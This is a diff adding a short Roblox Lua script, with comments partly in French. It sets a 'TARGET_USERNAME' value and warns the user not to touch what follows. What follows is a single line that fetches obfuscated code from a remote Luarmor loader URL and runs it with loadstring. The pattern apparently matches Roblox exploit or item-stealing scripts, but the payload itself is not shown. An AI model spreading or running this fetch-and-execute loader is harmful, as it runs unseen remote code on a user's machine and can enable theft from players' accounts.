@@ -1,0 +1,9 @@
+-- ============================================
+-- CONFIGURATION (CHANGE YOUR USERNAME BELOW)
+-- ============================================
+getgenv().TARGET_USERNAME = "ha_Floxz" -- Mets ton pseudo Roblox ici
+
+-- ============================================
+-- DO NOT TOUCH BELOW / NE PAS TOUCHER EN BAS
+-- ============================================
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/3dfe9bec71126d4af78bf4a4ae4d9104.lua"))()
